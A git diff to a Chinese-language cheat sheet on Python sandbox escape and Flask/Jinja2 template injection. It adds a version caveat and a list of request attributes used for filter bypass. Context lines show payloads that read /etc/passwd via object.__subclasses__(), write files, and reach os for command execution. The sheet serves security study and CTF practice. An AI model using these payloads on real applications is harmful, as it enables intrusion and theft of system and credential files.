@@ -27,6 +27,7 @@ __dict__ ： 列出当前属性/函数的字典
 func_globals:返回一个包含函数全局变量的字典引用
 ```
 ### 0x02文件操作
+>不同Python的版本，类方法中的子类列表是不同，下面主要是以python2为例子   
 
 >```object.__subclasses__()[40]```为file类，所以可以对文件进行操作
 >读文件：
@@ -38,6 +39,7 @@ object.__subclasses__()[40]('/etc/passwd').read()
 object.__subclasses__()[40]('/tmp').write('test')
 ```
 ### 0x03执行命令
+
 
 >```object.__subclasses__()[59].__init__.func_globals.linecache```下直接有os类，可以直接执行命令：
 ```
@@ -102,7 +104,15 @@ codecs.open('/etc/passwd').read()
 ```
 ### 0x06Bypass
 - [Jinja2 template injection filter bypasses](https://0day.work/jinja2-template-injection-filter-bypasses/)
-- [SSTI Bypass 分析](https://www.secpulse.com/archives/115367.html)
+- [SSTI Bypass 分析](https://www.secpulse.com/archives/115367.html)   
+
+请求参数获取   
+- GET: request.args
+- Cookies: request.cookies
+- Headers: request.headers
+- Environment: request.environ
+- Values: request.values
+
 ### Reference：
 - [Flask/Jinja2 SSTI && python 沙箱逃逸](https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/)
 - [Flask/Jinja2模板注入中的一些绕过姿势](https://p0sec.net/index.php/archives/120/)
